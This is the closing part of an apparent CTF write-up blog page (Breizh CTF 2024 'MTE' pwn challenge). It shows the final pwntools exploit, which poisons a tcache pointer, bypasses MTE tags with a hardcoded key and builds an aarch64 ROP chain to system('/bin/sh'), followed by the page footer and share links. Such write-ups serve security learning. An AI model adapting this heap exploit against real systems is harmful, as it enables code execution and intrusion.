+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">alloc</span>(index,size,data):
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Print</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,str(index)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,hex(size)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(index):
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Print</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,str(index)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(index,data):
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Print</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,str(index)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_alloc</span>(index):
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Print</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,str(index)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    rcu(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> rcvl()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">go_exit</span>():
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Print</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;5&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">obfuscate</span>(p, adr):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">^</span>(adr<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">12</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        conn()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># grow up heap to bypass mprotect restricted range</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">500</span>):
+</span></span><span style="display:flex;"><span>            alloc(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0x100</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        alloc(<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0x80</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>)
+</span></span><span style="display:flex;"><span>        alloc(<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">0x80</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        free(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>        free(<span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        tcache_heap_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400005500034ab0</span> <span style="color:#75715e"># w/ MTE key (BF)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#tcache_heap_addr_DBG = int(input(&#34;[DBG] KEY : &#34;),16)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#tcache_heap_addr = tcache_heap_addr_DBG</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;tcache_heap_addr @ </span><span style="color:#e6db74">{</span>hex(tcache_heap_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>        targ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x005501813cf0</span>
+</span></span><span style="display:flex;"><span>        obfu <span style="color:#f92672">=</span> obfuscate(targ,tcache_heap_addr)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        edit(<span style="color:#ae81ff">3</span>,p64(obfu))
+</span></span><span style="display:flex;"><span>        alloc(<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">0x80</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5501860000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        binsh <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>        gadget <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000069500</span> <span style="color:#75715e"># 0x0000000000069500 : ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret</span>
+</span></span><span style="display:flex;"><span>        system <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(gadget) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0xdead</span>) <span style="color:#f92672">+</span> p64(system) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0xdead</span>) <span style="color:#f92672">+</span> p64(binsh)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        alloc(<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">0x80</span>,data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># data = print_alloc(1)</span>
+</span></span><span style="display:flex;"><span>        go_exit()
+</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;cat /flag*&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>
+</span></span></code></pre></div>
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories">Categories</a></li>
+         
+          <li><a href="/whoami">Whoami</a></li>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#reverse">Reverse</a></li>
+    <li><a href="#exploitation">Exploitation</a></li>
+    <li><a href="#final-exploit">Final exploit</a></li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_mte%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_mte%2f&text=Breizh%20CTF%202024%20-%20Write-up%20MTE%20-%20Pwn" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_mte%2f&title=Breizh%20CTF%202024%20-%20Write-up%20MTE%20-%20Pwn" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_mte%2f&is_video=false&description=Breizh%20CTF%202024%20-%20Write-up%20MTE%20-%20Pwn" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Breizh%20CTF%202024%20-%20Write-up%20MTE%20-%20Pwn&body=Check out this article: https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_mte%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_mte%2f&title=Breizh%20CTF%202024%20-%20Write-up%20MTE%20-%20Pwn" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_mte%2f&title=Breizh%20CTF%202024%20-%20Write-up%20MTE%20-%20Pwn" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_mte%2f&name=Breizh%20CTF%202024%20-%20Write-up%20MTE%20-%20Pwn&description=Here%20is%20the%20write-up%20of%20MTE%20challenge%20which%20I%20created%20for%20the%20Breizh%20CTF%202024.%20This%20is%20a%20Pwn%20challenge%20classified%20as%20difficult%2fvery%20difficult.%0aDescription%20Do%20you%20know%20MTE%3f%20It%26%2339%3bs%20a%20new%20feature%20on%20the%20latest%20ARM%20CPUs%2c%20no%20more%20exploitation%20in%20the%20heap%2c%20what%20happiness%21%20I%26%2339%3bve%20implemented%20it%20on%20top%20of%20glibc%20in%20a%20little%20binary%20emulated%20via%20qemu%2c%20so%20you%20can%26%2339%3bt%20pwn%20it%2c%20but%20...%20Reverse%20For%20this%20challenge%2c%20we%20have%20an%20aarch64%20binary%2c%20and%20from%20the%20description%2c%20we%20know%20it%20implicates%20implementation%20of%20MTE%20technology%20over%20glibc." aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_mte%2f&t=Breizh%20CTF%202024%20-%20Write-up%20MTE%20-%20Pwn" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2024  Itarow 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/categories">Categories</a></li>
+         
+        <li><a href="/whoami">Whoami</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+
+
+</html>
